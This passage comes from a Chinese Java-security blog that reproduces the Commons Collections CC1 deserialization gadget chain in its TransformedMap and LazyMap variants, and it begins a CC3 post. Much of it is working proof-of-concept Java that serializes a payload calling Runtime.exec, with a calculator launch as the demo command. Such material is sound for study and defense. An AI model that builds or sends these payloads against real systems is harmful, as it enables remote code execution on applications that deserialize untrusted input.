class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        chainedTransformer.transform(Runtime.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"0qppfEPN_m5ibwf_cP4owCgncIOyDJbmB57hqvJao6U.png\" alt=\"image\"></p>\n<h3 id=\"绕过memberType-x3D-null\"><a href=\"#绕过memberType-x3D-null\" class=\"headerlink\" title=\"绕过memberType !&#x3D; null\"></a>绕过memberType !&#x3D; null</h3><p>我们继续来测试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/26 4:12 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestInvokerTransformer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,  <span class=\"literal\">null</span>,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Target.class,decorate);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>发现执行之后没有进入到if里面 if (memberType !&#x3D; null)</p>\n<p><img src=\"wAThfu3rwkconWkuXgSKMk3y8a5YRCSkDLM9X3oV1lI.png\" alt=\"image\"></p>\n<p>分析发现 在memberValue 变量中获取键名 name 的值，用于与 memberTypes 中存储的成员类型进行匹配。然后使用 memberType 变量来判断成员类型是否存在。那么我们只需要传入的参数在它的成员类型里面，条件就可以成立了。</p>\n<p><img src=\"rL18y32T-zjP0yVa2PLnEvRs6aIDEsbw9NyWQaT7L4A.png\" alt=\"image\"></p>\n<p>hashedMap.put(“value”,”value”)；成功进入到setvalue里面</p>\n<p><img src=\"TgkhyLaLxhGnh5NHWvKoJ9kTbfnfFC7zDCHPZdS5C9I.png\" alt=\"image\"></p>\n<p>最后我们得到一个完整的demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        hashedMap.put(<span class=\"string\">&quot;value&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hashedMap,  <span class=\"literal\">null</span>,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; declaredConstructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        declaredConstructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> declaredConstructor.newInstance(Target.class,decorate);</span><br><span class=\"line\">        </span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"f7Pokh3dgW5IbOfuKmrMZx26WIpMIgdvjqrNLN6XqfY.png\" alt=\"image\"></p>\n<h3 id=\"完整利用链\"><a href=\"#完整利用链\" class=\"headerlink\" title=\"完整利用链\"></a>完整利用链</h3><p>得到了最终的利用链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc1 chain:</span><br><span class=\"line\">        ObjectInputStream.readObject()</span><br><span class=\"line\">            AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">                         TransformedMap.decorate()</span><br><span class=\"line\">                            Map(Proxy).entrySet()</span><br><span class=\"line\">                            MapEntry.setValue()</span><br><span class=\"line\">                            TransformedMap.checkSetValue()</span><br><span class=\"line\">​                              ChainedTransformer.transform()</span><br><span class=\"line\">​                                ConstantTransformer.transform()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Class.getMethod()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Runtime.getRuntime()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Runtime.exec()</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Ysoserial-中的-LazyMap\"><a href=\"#Ysoserial-中的-LazyMap\" class=\"headerlink\" title=\"Ysoserial 中的 LazyMap\"></a>Ysoserial 中的 LazyMap</h2><p>我们再来看一下ysoserial 中的 LazyMap</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc1 chain:</span><br><span class=\"line\">        ObjectInputStream.readObject()</span><br><span class=\"line\">            AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">                Map(Proxy).entrySet()</span><br><span class=\"line\">                    AnnotationInvocationHandler.invoke()</span><br><span class=\"line\">                        LazyMap.get()</span><br><span class=\"line\">                            ChainedTransformer.transform()</span><br><span class=\"line\">                                ConstantTransformer.transform()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Class.getMethod()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Runtime.getRuntime()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p>与上述的利用链相比，两者相差不大，这里是调用了LazyMap的get，而我们上面是调用的TransformedMap</p>\n<p><img src=\"hT62dmpKk5jrTw-uiMmT8TdCbc-EPa4E9uAwGJmmzrg.png\" alt=\"image\"></p>\n<p>我们看到在AnnotationInvocationHandler.invoke () 中有调用到LazyMap的get；且是可控的。</p>\n<p><img src=\"zFUm7yUmyzP4k0rD8oDP5sXfWUhEQlA6NE2KH6PqxJo.png\" alt=\"image\"></p>\n<p>如此一来，我们只需要一个动态代理就可以调用到invoke；当进入invoke方法之后。期间还需要一个无参调用才能绕过中间那个异常达到get方法</p>\n<p>然而在AnnotationinvocationHandler 类的 readObject 方法里有个无参方法</p>\n<p><img src=\"6T6MqJfGKeA3PfPIqxq8SoOnybYM10HFPflsyXONfio.png\" alt=\"image\"></p>\n<p>于是在外面嵌套一层该类的构造方法，得到如下的payload</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/6/1 2:49 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestExe</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">HashedMap</span> <span class=\"variable\">hashedMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashedMap</span>();</span><br><span class=\"line\">        Map&lt;Object, Object&gt; decorate = LazyMap.decorate(hashedMap, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; Clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; constructor = Clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> constructor.newInstance(Override.class, decorate);</span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">mapProxy</span> <span class=\"operator\">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Map.class&#125;, (InvocationHandler) o);</span><br><span class=\"line\">        Object obj= constructor.newInstance(Target.class,mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(obj);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"e0BxwZ0MQSzV_rmSr0Xqnm1Xq0UxCHsXSfdJYOc4osw.png\" alt=\"image\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>1.Java安全漫谈 - 09.反序列化篇(3)</p>\n<p>2.<a href=\"http://blog.m1kael.cn/index.php/archives/492/\">http://blog.m1kael.cn/index.php/archives/492/</a></p>\n<p>3.<a href=\"https://xz.aliyun.com/t/12019#toc-4\">https://xz.aliyun.com/t/12019#toc-4</a></p>\n","categories":["Java安全"],"tags":["漏洞复现","反序列化","CC链"]},{"title":"Java安全之cc3链","url":"/2023/08/14/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc3%E9%93%BE/","content":"<h1 id=\"Java安全之cc3链\"><a href=\"#Java安全之cc3链\" class=\"headerlink\" title=\"Java安全之cc3链\"></a>Java安全之cc3链</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我们前面进行了Java的类加载分析，发现最底层是defineClass进行加载。也用两种方式（TemplatesImpl和BCEL）实现了Java的类加载执行恶意类。下面我们来把cc1中的执行命令的方式，改为加载恶意类来执行，进而探讨cc3的实现。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"原始的CC1使用TemplatesImpl实现执行命令\"><a href=\"#原始的CC1使用TemplatesImpl实现执行命令\" class=\"headerlink\" title=\"原始的CC1使用TemplatesImpl实现执行命令\"></a>原始的CC1使用TemplatesImpl实现执行命令</h2><p>回顾一下最开始的cc1的利用链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc1 chain:</span><br><span class=\"line\">        ObjectInputStream.readObject()</span><br><span class=\"line\">            AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">                         TransformedMap.decorate()</span><br><span class=\"line\">                            Map(Proxy).entrySet()</span><br><span class=\"line\">                            MapEntry.setValue()</span><br><span class=\"line\">                            TransformedMap.checkSetValue()</span><br><span class=\"line\">​                              ChainedTransformer.transform()</span><br><span class=\"line\">​                                ConstantTransformer.transform()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Class.getMethod()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Runtime.getRuntime()</span><br><span class=\"line\">​                                InvokerTransformer.transform()</span><br><span class=\"line\">​                                    Method.invoke()</span><br><span class=\"line\">​                                        Runtime.exec()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"A2rPuJTrQOVK6i28evj5xzumRazhj2LihoiUxtLUlD0.png\" alt=\"image\"></p>\n<p>这条链子使用的是InvokerTransformer.transform()来实现反射调用runtime执行命令；我们修改成使用TemplatesImpl加载恶意类来实现执行命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span 